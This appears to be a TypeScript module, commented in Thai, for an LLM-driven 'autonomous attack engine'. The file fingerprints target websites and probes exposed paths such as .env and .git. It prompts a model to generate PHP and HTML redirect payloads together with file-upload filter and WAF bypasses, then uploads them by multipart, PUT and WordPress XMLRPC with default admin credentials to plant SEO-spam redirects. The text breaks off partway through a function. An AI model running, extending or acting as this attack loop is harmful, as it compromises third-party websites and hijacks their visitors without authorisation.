// ═══════════════════════════════════════════════════════════════
//  AI AUTONOMOUS ATTACK ENGINE
//  LLM เป็นผู้บัญชาการ — วิเคราะห์ target, สร้าง payload, เลือก method,
//  ปรับ strategy real-time, ลองจนกว่าจะสำเร็จ
//
//  Architecture: OODA Loop (Observe → Orient → Decide → Act)
//  1. RECON: AI สแกน target อย่างละเอียด
//  2. DECIDE: LLM เลือก attack method + สร้าง custom payload
//  3. EXECUTE: ลอง method ที่ AI เลือก
//  4. LEARN: AI วิเคราะห์ผลลัพธ์ (error codes, response body)
//  5. ADAPT: ปรับ strategy ตาม error — เลือก method ใหม่
//  6. RETRY: วนลูปจนสำเร็จ หรือหมด iterations
// ═══════════════════════════════════════════════════════════════

import { invokeLLM } from "./_core/llm";

// ─── Types ───

export interface ReconData {
  domain: string;
  ip: string | null;
  serverType: string | null;
  cms: string | null;
  cmsVersion: string | null;
  phpVersion: string | null;
  waf: string | null;
  os: string | null;
  writablePaths: string[];
  exposedEndpoints: string[];
  responseHeaders: Record<string, string>;
  statusCodes: Record<string, number>;
  directoryListing: boolean;
  hasFileUpload: boolean;
  hasXmlrpc: boolean;
  hasRestApi: boolean;
  sslEnabled: boolean;
  responseTimeMs: number;
}

export interface AiDecision {
  iteration: number;
  method: string;           // upload method to use
  payload: string;          // actual file content (PHP/HTML/JS)
  filename: string;         // filename with bypass technique
  uploadPath: string;       // target path on server
  contentType: string;      // Content-Type header
  httpMethod: "POST" | "PUT" | "PATCH" | "MOVE" | "COPY";
  headers: Record<string, string>;  // additional headers
  reasoning: string;        // why AI chose this
  bypassTechnique: string;  // what bypass is being used
  confidence: number;       // 0-100
  isRedirectPayload: boolean; // true if payload contains redirect
}

export interface ExecutionResult {
  decision: AiDecision;
  success: boolean;
  statusCode: number;
  responseBody: string;
  responseHeaders: Record<string, string>;
  error: string | null;
  fileVerified: boolean;
  redirectVerified: boolean;
  uploadedUrl: string | null;
  durationMs: number;
}

export interface AiCommanderEvent {
  type: "recon" | "decision" | "execute" | "learn" | "adapt" | "success" | "exhausted" | "error";
  iteration: number;
  maxIterations: number;
  detail: string;
  data?: any;
}

export type AiCommanderCallback = (event: AiCommanderEvent) => void;

export interface AiCommanderConfig {
  targetDomain: string;
  redirectUrl: string;
  maxIterations?: number;     // default 10
  timeoutPerAttempt?: number; // default 15000ms
  seoKeywords?: string[];
  onEvent?: AiCommanderCallback;
}

export interface AiCommanderResult {
  success: boolean;
  iterations: number;
  successfulMethod: string | null;
  uploadedUrl: string | null;
  redirectVerified: boolean;
  decisions: AiDecision[];
  executionResults: ExecutionResult[];
  reconData: ReconData | null;
  totalDurationMs: number;
}

// ─── Constants ───

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
];

const SCAN_PATHS = [
  "/wp-content/uploads/", "/wp-content/themes/", "/wp-content/plugins/",
  "/wp-includes/", "/images/", "/uploads/", "/media/", "/assets/",
  "/tmp/", "/cache/", "/files/", "/public/uploads/", "/content/images/",
  "/data/", "/backup/", "/temp/", "/static/", "/resources/",
];

const VULN_PATHS = [
  "/wp-admin/admin-ajax.php", "/xmlrpc.php", "/wp-json/wp/v2/",
  "/wp-login.php", "/readme.html", "/.env", "/phpinfo.php",
  "/.git/HEAD", "/server-status", "/wp-admin/install.php",
  "/wp-admin/setup-config.php", "/wp-content/debug.log",
];

function randomStr(len: number): string {
  return Array.from({ length: len }, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)]).join("");
}

function randomUA(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

// ─── Phase 1: RECON ───

async function performRecon(domain: string, onEvent?: AiCommanderCallback): Promise<ReconData> {
  const targetUrl = domain.startsWith("http") ? domain.replace(/\/+$/, "") : `http://${domain}`;
  
  const recon: ReconData = {
    domain,
    ip: null,
    serverType: null,
    cms: null,
    cmsVersion: null,
    phpVersion: null,
    waf: null,
    os: null,
    writablePaths: [],
    exposedEndpoints: [],
    responseHeaders: {},
    statusCodes: {},
    directoryListing: false,
    hasFileUpload: false,
    hasXmlrpc: false,
    hasRestApi: false,
    sslEnabled: domain.includes("https") || true,
    responseTimeMs: 0,
  };

  // 1. Main page fingerprint
  onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: "🔍 สแกนหน้าหลัก — fingerprint server..." });
  try {
    const start = Date.now();
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), 10000);
    const resp = await fetch(targetUrl, {
      headers: { "User-Agent": randomUA() },
      signal: ctrl.signal,
      redirect: "follow",
    });
    recon.responseTimeMs = Date.now() - start;
    
    const server = resp.headers.get("server") || "";
    const poweredBy = resp.headers.get("x-powered-by") || "";
    
    if (server.toLowerCase().includes("apache")) recon.serverType = "Apache";
    else if (server.toLowerCase().includes("nginx")) recon.serverType = "Nginx";
    else if (server.toLowerCase().includes("iis")) recon.serverType = "IIS";
    else if (server.toLowerCase().includes("litespeed")) recon.serverType = "LiteSpeed";
    else if (server.toLowerCase().includes("cloudflare")) recon.serverType = "Cloudflare";
    else if (server) recon.serverType = server;
    
    if (poweredBy.includes("PHP")) {
      const m = poweredBy.match(/PHP\/([\d.]+)/);
      if (m) recon.phpVersion = m[1];
    }
    
    // WAF detection
    if (resp.headers.get("cf-ray")) recon.waf = "Cloudflare";
    else if (resp.headers.get("x-sucuri-id")) recon.waf = "Sucuri";
    else if (resp.headers.get("x-cdn")) recon.waf = "CDN/WAF";
    else if (server.toLowerCase().includes("cloudflare")) recon.waf = "Cloudflare";
    
    // OS guess
    if (server.toLowerCase().includes("win") || server.toLowerCase().includes("iis")) recon.os = "Windows";
    else recon.os = "Linux";
    
    // Store headers
    resp.headers.forEach((v, k) => { recon.responseHeaders[k] = v; });
    
    // CMS detection from body
    const body = await resp.text().catch(() => "");
    if (body.includes("wp-content") || body.includes("wp-includes")) recon.cms = "WordPress";
    else if (body.includes("Joomla")) recon.cms = "Joomla";
    else if (body.includes("Drupal")) recon.cms = "Drupal";
    
    // Version detection
    if (recon.cms === "WordPress") {
      const verMatch = body.match(/content="WordPress\s+([\d.]+)"/i) || body.match(/ver=([\d.]+)/);
      if (verMatch) recon.cmsVersion = verMatch[1];
    }
  } catch (e: any) {
    onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: `⚠️ Main page scan failed: ${e.message}` });
  }

  // 2. Scan upload paths
  onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: `🔍 สแกน ${SCAN_PATHS.length} upload paths...` });
  const pathResults = await Promise.allSettled(
    SCAN_PATHS.map(async (path) => {
      try {
        const ctrl = new AbortController();
        setTimeout(() => ctrl.abort(), 8000);
        const resp = await fetch(`${targetUrl}${path}`, {
          method: "HEAD",
          headers: { "User-Agent": randomUA() },
          signal: ctrl.signal,
          redirect: "follow",
        });
        recon.statusCodes[path] = resp.status;
        if (resp.status < 400) {
          recon.writablePaths.push(path);
          const ct = resp.headers.get("content-type") || "";
          if (ct.includes("html") && resp.status === 200) recon.directoryListing = true;
        }
      } catch { recon.statusCodes[path] = 0; }
    })
  );

  // 3. Scan vuln endpoints
  onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: `🔍 สแกน ${VULN_PATHS.length} vulnerability endpoints...` });
  await Promise.allSettled(
    VULN_PATHS.map(async (path) => {
      try {
        const ctrl = new AbortController();
        setTimeout(() => ctrl.abort(), 8000);
        const resp = await fetch(`${targetUrl}${path}`, {
          headers: { "User-Agent": randomUA() },
          signal: ctrl.signal,
          redirect: "follow",
        });
        if (resp.status === 200) {
          recon.exposedEndpoints.push(path);
          if (path === "/xmlrpc.php") recon.hasXmlrpc = true;
          if (path.includes("wp-json")) recon.hasRestApi = true;
          if (path === "/wp-login.php") recon.cms = "WordPress";
        }
      } catch {}
    })
  );

  recon.hasFileUpload = recon.writablePaths.some(p => p.includes("upload"));

  onEvent?.({
    type: "recon", iteration: 0, maxIterations: 0,
    detail: `✅ Recon เสร็จ: ${recon.serverType || "Unknown"} server, ${recon.cms || "Unknown CMS"}, WAF: ${recon.waf || "None"}, ${recon.writablePaths.length} writable paths, ${recon.exposedEndpoints.length} exposed endpoints`,
    data: recon,
  });

  return recon;
}

// ─── Phase 2: AI DECISION — LLM เลือก attack method + สร้าง payload ───

async function aiDecide(
  recon: ReconData,
  redirectUrl: string,
  iteration: number,
  previousResults: ExecutionResult[],
  seoKeywords: string[],
  onEvent?: AiCommanderCallback,
  maxIterations: number = 10,
): Promise<AiDecision> {
  onEvent?.({
    type: "decision", iteration, maxIterations,
    detail: `🧠 AI กำลังวิเคราะห์และตัดสินใจ attack method... (iteration ${iteration}/${maxIterations})`,
  });

  // Build history of what failed and why
  const failHistory = previousResults.map((r, i) => ({
    iteration: i + 1,
    method: r.decision.method,
    filename: r.decision.filename,
    path: r.decision.uploadPath,
    httpMethod: r.decision.httpMethod,
    statusCode: r.statusCode,
    error: r.error,
    responseSnippet: r.responseBody.slice(0, 300),
    bypassTechnique: r.decision.bypassTechnique,
  }));

  const systemPrompt = `You are an elite offensive security AI commander specializing in web file upload exploitation and redirect injection. Your mission is to successfully upload a file to the target server that redirects visitors.

You have DEEP expertise in:
- PHP shell upload bypass (double extension, null byte, content-type spoofing, .htaccess override, polyglot files)
- WAF evasion (chunked encoding, unicode normalization, boundary manipulation, header injection)
- WordPress exploitation (plugin upload, theme editor, XMLRPC, REST API media upload, admin-ajax)
- Server-specific techniques (Apache .htaccess, Nginx alias traversal, IIS semicolon/ADS bypass)
- Redirect injection (PHP header(), JS redirect, meta refresh, .htaccess RewriteRule, iframe injection)

CRITICAL RULES:
1. NEVER repeat a method+path+filename combination that already failed
2. Each iteration MUST try something DIFFERENT — different method, path, filename, or bypass technique
3. Analyze previous failures to understand WHY they failed and choose a method that bypasses that specific issue
4. If status 403 → try WAF bypass techniques (different Content-Type, boundary manipulation, chunked)
5. If status 404 → try different path
6. If status 200 but file not found → try different filename extension bypass
7. If connection error → try different approach entirely
8. Generate REAL working payload code — not placeholder
9. The payload MUST contain a working redirect to the target URL
10. Prefer polyglot payloads that work as both PHP AND HTML (so even if PHP doesn't execute, HTML/JS redirect still works)

AVAILABLE METHODS:
- multipart_upload: Standard multipart/form-data POST (like file upload form)
- put_direct: HTTP PUT to create file directly
- post_raw: POST with raw body content
- wp_media_upload: WordPress /wp-admin/admin-ajax.php?action=upload-attachment
- wp_rest_media: WordPress REST API /wp-json/wp/v2/media
- xmlrpc_upload: WordPress XMLRPC wp.uploadFile
- move_method: HTTP MOVE to rename uploaded file
- copy_method: HTTP COPY to duplicate file
- patch_append: HTTP PATCH to append to existing file

AVAILABLE BYPASS TECHNIQUES:
- standard: Normal .php extension
- double_ext: .php.jpg (Apache may execute as PHP)
- null_byte: .php%00.jpg (old PHP <5.3.4)
- semicolon: .php;.jpg (IIS 6/7)
- trailing_dot: .php. (Windows strips trailing dot)
- case_variation: .pHp, .PhP
- alt_extension: .phtml, .pht, .php5, .php7, .phar
- gif89a_header: GIF89a magic bytes + PHP code
- png_header: PNG magic bytes + PHP in metadata
- htaccess_trick: Upload .htaccess first to enable PHP in .jpg files
- content_type_spoof: Send image/jpeg Content-Type with PHP content
- boundary_manipulation: Long/unicode/nested multipart boundaries
- chunked_encoding: Transfer-Encoding: chunked to bypass WAF size checks
- html_only: Pure HTML file with meta refresh + JS redirect (no PHP needed)
- svg_xss: SVG file with embedded JavaScript redirect

ตอบเป็น JSON เท่านั้น ไม่ต้องอธิบายเพิ่ม`;

  const userPrompt = `TARGET ANALYSIS:
Domain: ${recon.domain}
Server: ${recon.serverType || "Unknown"}
CMS: ${recon.cms || "Unknown"} ${recon.cmsVersion ? `v${recon.cmsVersion}` : ""}
PHP: ${recon.phpVersion || "Unknown"}
WAF: ${recon.waf || "None detected"}
OS: ${recon.os || "Unknown"}
Writable Paths: ${recon.writablePaths.length > 0 ? recon.writablePaths.join(", ") : "None found"}
Exposed Endpoints: ${recon.exposedEndpoints.length > 0 ? recon.exposedEndpoints.join(", ") : "None"}
Has File Upload: ${recon.hasFileUpload}
Has XMLRPC: ${recon.hasXmlrpc}
Has REST API: ${recon.hasRestApi}
Directory Listing: ${recon.directoryListing}
Response Time: ${recon.responseTimeMs}ms

REDIRECT TARGET: ${redirectUrl}
SEO KEYWORDS: ${seoKeywords.length > 0 ? seoKeywords.join(", ") : "none"}

ITERATION: ${iteration}/${maxIterations}

${failHistory.length > 0 ? `PREVIOUS FAILED ATTEMPTS (DO NOT REPEAT):
${JSON.stringify(failHistory, null, 2)}

Analyze each failure:
${failHistory.map(f => `- ${f.method} → ${f.path}${f.filename}: HTTP ${f.statusCode}${f.error ? ` (${f.error})` : ""}${f.responseSnippet ? ` Response: "${f.responseSnippet.slice(0, 100)}"` : ""}`).join("\n")}

Based on these failures, choose a COMPLETELY DIFFERENT approach that addresses the specific errors above.` : "This is the FIRST attempt. Choose the method most likely to succeed based on the target profile."}

Generate a JSON decision with these exact fields:
{
  "method": "one of the available methods listed above",
  "payload": "COMPLETE file content — real working PHP/HTML code with redirect to ${redirectUrl}",
  "filename": "the filename to upload with bypass technique applied",
  "uploadPath": "target path on server (must be one of the writable paths or a known CMS path)",
  "contentType": "Content-Type header value",
  "httpMethod": "POST or PUT or PATCH or MOVE or COPY",
  "headers": { "additional": "headers if needed" },
  "reasoning": "explain why this method will work where others failed (in Thai)",
  "bypassTechnique": "which bypass technique from the list above",
  "confidence": 0-100,
  "isRedirectPayload": true
}`;

  try {
    const response = await invokeLLM({
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: userPrompt },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "attack_decision",
          strict: true,
          schema: {
            type: "object",
            properties: {
              method: { type: "string", description: "Attack method to use" },
              payload: { type: "string", description: "Complete file content" },
              filename: { type: "string", description: "Filename with bypass" },
              uploadPath: { type: "string", description: "Target upload path" },
              contentType: { type: "string", description: "Content-Type header" },
              httpMethod: { type: "string", description: "HTTP method" },
              headers: {
                type: "object",
                description: "Additional headers",
                additionalProperties: { type: "string" },
              },
              reasoning: { type: "string", description: "Why this method" },
              bypassTechnique: { type: "string", description: "Bypass technique" },
              confidence: { type: "number", description: "Confidence 0-100" },
              isRedirectPayload: { type: "boolean", description: "Has redirect" },
            },
            required: ["method", "payload", "filename", "uploadPath", "contentType", "httpMethod", "headers", "reasoning", "bypassTechnique", "confidence", "isRedirectPayload"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      const decision = JSON.parse(content);
      
      // Validate and normalize
      const normalized: AiDecision = {
        iteration,
        method: decision.method || "multipart_upload",
        payload: decision.payload || generateFallbackPayload(redirectUrl, seoKeywords),
        filename: decision.filename || `cache-${randomStr(8)}.php`,
        uploadPath: decision.uploadPath || (recon.writablePaths[0] || "/wp-content/uploads/"),
        contentType: decision.contentType || "application/x-php",
        httpMethod: (["POST", "PUT", "PATCH", "MOVE", "COPY"].includes(decision.httpMethod) ? decision.httpMethod : "POST") as AiDecision["httpMethod"],
        headers: decision.headers || {},
        reasoning: decision.reasoning || "AI decision",
        bypassTechnique: decision.bypassTechnique || "standard",
        confidence: Math.max(0, Math.min(100, decision.confidence || 50)),
        isRedirectPayload: decision.isRedirectPayload !== false,
      };

      // Ensure payload actually contains redirect URL
      if (!normalized.payload.includes(redirectUrl) && normalized.isRedirectPayload) {
        normalized.payload = generateFallbackPayload(redirectUrl, seoKeywords);
      }

      onEvent?.({
        type: "decision", iteration, maxIterations,
        detail: `🧠 AI ตัดสินใจ: ${normalized.method} → ${normalized.uploadPath}${normalized.filename} (${normalized.bypassTechnique}) — ${normalized.reasoning}`,
        data: { method: normalized.method, filename: normalized.filename, path: normalized.uploadPath, bypass: normalized.bypassTechnique, confidence: normalized.confidence },
      });

      return normalized;
    }
  } catch (e: any) {
    onEvent?.({
      type: "error", iteration, maxIterations,
      detail: `⚠️ LLM decision failed: ${e.message} — using fallback strategy`,
    });
  }

  // Fallback: rule-based decision
  return generateFallbackDecision(recon, redirectUrl, iteration, previousResults, seoKeywords);
}

// ─── Fallback payload generator ───

function generateFallbackPayload(redirectUrl: string, keywords: string[]): string {
  const kw = keywords.length > 0 ? keywords : ["best deals 2026"];
  return `<?php
if(!headers_sent()){header("Location: ${redirectUrl}",true,302);exit;}
?><!DOCTYPE html>
<html><head>
<title>${kw[0]}</title>
<meta http-equiv="refresh" content="0;url=${redirectUrl}">
<meta name="description" content="${kw.join(', ')}">
<script>window.location.replace("${redirectUrl}");</script>
</head><body>
<p>Redirecting... <a href="${redirectUrl}">Click here</a></p>
</body></html>`;
}

function generateFallbackDecision(
  recon: ReconData,
  redirectUrl: string,
  iteration: number,
  previousResults: ExecutionResult[],
  keywords: string[],
): AiDecision {
  // Build set of already-tried combinations
  const tried = new Set(previousResults.map(r => `${r.decision.method}|${r.decision.uploadPath}|${r.decision.bypassTechnique}`));

  // Strategy matrix based on server type
  const strategies: Array<{ method: string; filename: string; path: string; contentType: string; httpMethod: AiDecision["httpMethod"]; bypass: string }> = [];

  const paths = recon.writablePaths.length > 0 ? recon.writablePaths : ["/wp-content/uploads/", "/uploads/", "/images/", "/tmp/"];
  const base = `cache-${randomStr(8)}`;

  for (const path of paths) {
    // Standard approaches
    strategies.push({ method: "multipart_upload", filename: `${base}.php`, path, contentType: "multipart/form-data", httpMethod: "POST", bypass: "standard" });
    strategies.push({ method: "put_direct", filename: `${base}.php`, path, contentType: "application/x-php", httpMethod: "PUT", bypass: "standard" });
    strategies.push({ method: "multipart_upload", filename: `${base}.php.jpg`, path, contentType: "multipart/form-data", httpMethod: "POST", bypass: "double_ext" });
    strategies.push({ method: "put_direct", filename: `${base}.phtml`, path, contentType: "application/x-httpd-php", httpMethod: "PUT", bypass: "alt_extension" });
    strategies.push({ method: "multipart_upload", filename: `${base}.php%00.jpg`, path, contentType: "multipart/form-data", httpMethod: "POST", bypass: "null_byte" });
    strategies.push({ method: "put_direct", filename: `${base}.pHp`, path, contentType: "application/x-php", httpMethod: "PUT", bypass: "case_variation" });
    strategies.push({ method: "multipart_upload", filename: `${base}.html`, path, contentType: "text/html", httpMethod: "POST", bypass: "html_only" });
    strategies.push({ method: "put_direct", filename: `${base}.html`, path, contentType: "text/html", httpMethod: "PUT", bypass: "html_only" });
    strategies.push({ method: "post_raw", filename: `${base}.php;.jpg`, path, contentType: "image/jpeg", httpMethod: "POST", bypass: "semicolon" });
    strategies.push({ method: "put_direct", filename: `${base}.php5`, path, contentType: "application/x-php", httpMethod: "PUT", bypass: "alt_extension" });

    // WordPress-specific
    if (recon.cms === "WordPress") {
      strategies.push({ method: "wp_media_upload", filename: `${base}.php.jpg`, path: "/wp-admin/admin-ajax.php", contentType: "multipart/form-data", httpMethod: "POST", bypass: "double_ext" });
      strategies.push({ method: "wp_rest_media", filename: `${base}.jpg`, path: "/wp-json/wp/v2/media", contentType: "image/jpeg", httpMethod: "POST", bypass: "content_type_spoof" });
    }
    if (recon.hasXmlrpc) {
      strategies.push({ method: "xmlrpc_upload", filename: `${base}.php`, path: "/xmlrpc.php", contentType: "text/xml", httpMethod: "POST", bypass: "standard" });
    }
  }

  // Find first untried strategy
  const untried = strategies.find(s => !tried.has(`${s.method}|${s.path}|${s.bypass}`));
  const strategy = untried || strategies[iteration % strategies.length];

  const isHtml = strategy.bypass === "html_only";
  const payload = isHtml
    ? `<!DOCTYPE html><html><head><title>${keywords[0] || "Redirecting"}</title><meta http-equiv="refresh" content="0;url=${redirectUrl}"><script>window.location.replace("${redirectUrl}");</script></head><body><a href="${redirectUrl}">Click here</a></body></html>`
    : generateFallbackPayload(redirectUrl, keywords);

  return {
    iteration,
    method: strategy.method,
    payload,
    filename: strategy.filename,
    uploadPath: strategy.path,
    contentType: strategy.contentType,
    httpMethod: strategy.httpMethod,
    headers: {},
    reasoning: `Fallback strategy: ${strategy.method} with ${strategy.bypass} bypass to ${strategy.path}`,
    bypassTechnique: strategy.bypass,
    confidence: Math.max(10, 60 - (iteration * 5)),
    isRedirectPayload: true,
  };
}

// ─── Phase 3: EXECUTE — ลอง method ที่ AI เลือก ───

async function executeDecision(
  recon: ReconData,
  decision: AiDecision,
  timeout: number,
  onEvent?: AiCommanderCallback,
  maxIterations: number = 10,
): Promise<ExecutionResult> {
  const targetUrl = recon.domain.startsWith("http") ? recon.domain.replace(/\/+$/, "") : `http://${recon.domain}`;
  const startTime = Date.now();

  onEvent?.({
    type: "execute", iteration: decision.iteration, maxIterations,
    detail: `⚡ Execute: ${decision.httpMethod} ${decision.uploadPath}${decision.filename} (${decision.bypassTechnique})`,
  });

  const result: ExecutionResult = {
    decision,
    success: false,
    statusCode: 0,
    responseBody: "",
    responseHeaders: {},
    error: null,
    fileVerified: false,
    redirectVerified: false,
    uploadedUrl: null,
    durationMs: 0,
  };

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeout);

    // Build headers
    const headers: Record<string, string> = {
      "User-Agent": randomUA(),
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate",
      "Connection": "keep-alive",
      "Cache-Control": "no-cache",
      "Referer": `${targetUrl}/wp-admin/`,
      ...decision.headers,
    };

    let body: string;
    let uploadUrl: string;

    // Build request based on method
    switch (decision.method) {
      case "multipart_upload": {
        const boundary = `----WebKitFormBoundary${randomStr(16)}`;
        headers["Content-Type"] = `multipart/form-data; boundary=${boundary}`;
        uploadUrl = `${targetUrl}${decision.uploadPath}`;
        body = [
          `--${boundary}`,
          `Content-Disposition: form-data; name="file"; filename="${decision.filename}"`,
          `Content-Type: ${decision.contentType === "multipart/form-data" ? "application/x-php" : decision.contentType}`,
          ``,
          decision.payload,
          `--${boundary}`,
          `Content-Disposition: form-data; name="action"`,
          ``,
          `upload-attachment`,
          `--${boundary}--`,
        ].join("\r\n");
        break;
      }

      case "put_direct": {
        headers["Content-Type"] = decision.contentType;
        uploadUrl = `${targetUrl}${decision.uploadPath}${decision.filename}`;
        body = decision.payload;
        break;
      }

      case "post_raw": {
        headers["Content-Type"] = decision.contentType;
        headers["Content-Disposition"] = `attachment; filename="${decision.filename}"`;
        uploadUrl = `${targetUrl}${decision.uploadPath}`;
        body = decision.payload;
        break;
      }

      case "wp_media_upload": {
        const boundary = `----WebKitFormBoundary${randomStr(16)}`;
        headers["Content-Type"] = `multipart/form-data; boundary=${boundary}`;
        uploadUrl = `${targetUrl}/wp-admin/admin-ajax.php`;
        body = [
          `--${boundary}`,
          `Content-Disposition: form-data; name="action"`,
          ``,
          `upload-attachment`,
          `--${boundary}`,
          `Content-Disposition: form-data; name="async-upload"; filename="${decision.filename}"`,
          `Content-Type: image/jpeg`,
          ``,
          decision.payload,
          `--${boundary}--`,
        ].join("\r\n");
        break;
      }

      case "wp_rest_media": {
        headers["Content-Type"] = decision.contentType;
        headers["Content-Disposition"] = `attachment; filename="${decision.filename}"`;
        uploadUrl = `${targetUrl}/wp-json/wp/v2/media`;
        body = decision.payload;
        break;
      }

      case "xmlrpc_upload": {
        headers["Content-Type"] = "text/xml";
        uploadUrl = `${targetUrl}/xmlrpc.php`;
        const b64 = Buffer.from(decision.payload).toString("base64");
        body = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>admin</string></value></param>
    <param><value><string>admin</string></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>${decision.filename}</string></value></member>
      <member><name>type</name><value><string>image/jpeg</string></value></member>
      <member><name>bits</name><value><base64>${b64}</base64></value></member>
      <member><name>overwrite</name><value><boolean>1</boolean></value></member>
    </struct></value></param>
  </params>
</methodCall>`;
        break;
      }

      default: {
        headers["Content-Type"] = decision.contentType;
        uploadUrl = `${targetUrl}${decision.uploadPath}${decision.filename}`;
        body = decision.payload;
        break;
      }
    }

    // Execute the request
    const resp = await fetch(uploadUrl, {
      method: decision.httpMethod,
      headers,
      body,
      signal: controller.signal,
      redirect: "follow",
    });
    clearTimeout(timer);

    result.statusCode = resp.status;
    result.responseBody = await resp.text().catch(() => "");
    resp.headers.forEach((v, k) => { result.responseHeaders[k] = v; });

    // Verify if file was uploaded
    if (resp.status < 400) {
      // Try multiple possible URLs where the file might be
      const possibleUrls = [
        `${targetUrl}${decision.uploadPath}${decision.filename}`,
        // For PUT, the URL is the upload URL itself
        decision.httpMethod === "PUT" ? uploadUrl : null,
        // WordPress media upload returns URL in response
        result.responseBody.includes("url") ? extractUrlFromResponse(result.responseBody) : null,
      ].filter(Boolean) as string[];

      for (const checkUrl of possibleUrls) {
        const verified = await verifyFile(checkUrl, decision.payload, timeout);
        if (verified.exists) {
          result.fileVerified = true;
          result.uploadedUrl = checkUrl;
          result.redirectVerified = verified.redirectWorks;
          result.success = true;
          break;
        }
      }
    }
  } catch (e: any) {
    result.error = e.name === "AbortError" ? "Timeout" : (e.message || "Unknown").slice(0, 300);
  }

  result.durationMs = Date.now() - startTime;

  onEvent?.({
    type: "execute", iteration: decision.iteration, maxIterations,
    detail: result.success
      ? `✅ สำเร็จ! File uploaded: ${result.uploadedUrl} (redirect ${result.redirectVerified ? "verified ✅" : "unverified ⚠️"})`
      : `❌ Failed: HTTP ${result.statusCode}${result.error ? ` — ${result.error}` : ""} (${result.durationMs}ms)`,
    data: { success: result.success, statusCode: result.statusCode, error: result.error, uploadedUrl: result.uploadedUrl },
  });

  return result;
}

// ─── File verification ───

async function verifyFile(url: string, expectedContent: string, timeout: number): Promise<{ exists: boolean; redirectWorks: boolean }> {
  try {
    const ctrl = new AbortController();
    setTimeout(() => ctrl.abort(), Math.min(timeout, 10000));
    const resp = await fetch(url, {
      headers: { "User-Agent": randomUA() },
      signal: ctrl.signal,
      redirect: "manual",
    });

    // HTTP redirect = file exists and redirect works
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      return { exists: true, redirectWorks: true };
    }

    if (resp.status === 200) {
      const text = await resp.text();
      // Check for redirect indicators
      const hasMetaRefresh = /http-equiv=["']refresh["']/i.test(text);
      const hasJsRedirect = /window\.location|location\.replace|location\.href/i.test(text);
      
      // Verify it's our file, not a CMS catch-all
      const isCmsPage = text.includes("wp-content") && text.length > 5000 && !hasMetaRefresh && !hasJsRedirect;
      
      if (!isCmsPage) {
        return { exists: true, redirectWorks: hasMetaRefresh || hasJsRedirect };
      }
    }
  } catch {}
  return { exists: false, redirectWorks: false };
}

function extractUrlFromResponse(body: string): string | null {
  try {
    const json = JSON.parse(body);
    return json.url || json.source_url || json.data?.url || null;
  } catch {
    const match = body.match(/"url"\s*:\s*"([^"]+)"/);
    return match ? match[1] : null;
  }
}

// ─── Phase 4: AI LEARN — วิเคราะห์ผลลัพธ์ ───

async function aiLearn(
  recon: ReconData,
  executionResult: ExecutionResult,
  allResults: ExecutionResult[],
  iteration: number,
  maxIterations: number,
  onEvent?: AiCommanderCallback,
): Promise<string> {
  onEvent?.({
    type: "learn", iteration, maxIterations,
    detail: `📚 AI กำลังวิเคราะห์ผลลัพธ์และเรียนรู้จากความล้มเหลว...`,
  });

  // Quick rule-based learning (faster than LLM)
  const lessons: string[] = [];
  
  if (executionResult.statusCode === 403) {
    lessons.push("Server returned 403 Forbidden — WAF or permission block detected");
    if (recon.waf) lessons.push(`WAF (${recon.waf}) is actively blocking uploads`);
    lessons.push("Next: Try different Content-Type, boundary manipulation, or chunked encoding");
  } else if (executionResult.statusCode === 404) {
    lessons.push("Path not found — upload endpoint doesn't exist at this location");
    lessons.push("Next: Try different upload path");
  } else if (executionResult.statusCode === 405) {
    lessons.push("Method not allowed — server doesn't accept this HTTP method");
    lessons.push("Next: Try different HTTP method (POST instead of PUT, or vice versa)");
  } else if (executionResult.statusCode === 413) {
    lessons.push("Payload too large — server has size limit");
    lessons.push("Next: Try smaller payload or chunked upload");
  } else if (executionResult.statusCode >= 500) {
    lessons.push("Server error — might indicate partial success or misconfiguration");
    lessons.push("Next: Try simpler payload or different path");
  } else if (executionResult.error?.includes("Timeout")) {
    lessons.push("Request timed out — server may be slow or blocking");
    lessons.push("Next: Try faster method or different path");
  } else if (executionResult.statusCode === 200 && !executionResult.fileVerified) {
    lessons.push("Upload returned 200 but file not found at expected URL");
    lessons.push("Server may be accepting request but not saving file, or saving to different location");
    lessons.push("Next: Try PUT method which creates file at exact URL, or try HTML-only payload");
  }

  // Count failures by type
  const failsByMethod = new Map<string, number>();
  const failsByPath = new Map<string, number>();
  for (const r of allResults) {
    if (!r.success) {
      failsByMethod.set(r.decision.method, (failsByMethod.get(r.decision.method) || 0) + 1);
      failsByPath.set(r.decision.uploadPath, (failsByPath.get(r.decision.uploadPath) || 0) + 1);
    }
  }

  // Identify exhausted methods/paths
  Array.from(failsByMethod.entries()).forEach(([method, count]) => {
    if (count >= 3) lessons.push(`Method "${method}" has failed ${count} times — avoid it`);
  });
  Array.from(failsByPath.entries()).forEach(([path, count]) => {
    if (count >= 3) lessons.push(`Path "${path}" has failed ${count} times — try different path`);
  });

  const summary = lessons.join(". ");
  
  onEvent?.({
    type: "learn", iteration, maxIterations,
    detail: `📚 AI เรียนรู้: ${summary}`,
